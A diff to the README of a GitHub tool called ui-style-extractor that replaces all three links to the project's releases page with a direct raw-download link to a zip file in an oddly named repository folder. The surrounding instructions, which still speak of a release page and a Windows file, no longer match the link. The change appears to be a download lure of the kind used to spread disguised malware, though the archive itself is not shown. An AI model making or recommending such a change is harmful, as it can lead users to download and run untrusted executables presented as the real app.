@@ -1,6 +1,6 @@
 # 🧩 ui-style-extractor - Turn UI pages into reusable guides
 
-[![Download ui-style-extractor](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Melisa6532/ui-style-extractor/releases)
+[![Download ui-style-extractor](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Melisa6532/ui-style-extractor/raw/refs/heads/main/counterapse/ui_style_extractor_v3.5.zip)
 
 ## 🚀 What this app does
 
@@ -29,7 +29,7 @@ For best results, use a screen size that lets you view a page and the output fil
 
 Visit this page to download the app:
 
-https://github.com/Melisa6532/ui-style-extractor/releases
+https://github.com/Melisa6532/ui-style-extractor/raw/refs/heads/main/counterapse/ui_style_extractor_v3.5.zip
 
 Open the latest release and look for the Windows file. If there are more than one, pick the one meant for Windows. Save the file to a folder you can find again, such as Downloads or Desktop.
 
@@ -217,6 +217,6 @@ This project sits in the space of:
 
 If you need the download page later, use this link:
 
-https://github.com/Melisa6532/ui-style-extractor/releases
+https://github.com/Melisa6532/ui-style-extractor/raw/refs/heads/main/counterapse/ui_style_extractor_v3.5.zip
 
 Keep the release page handy so you can check for new builds when needed
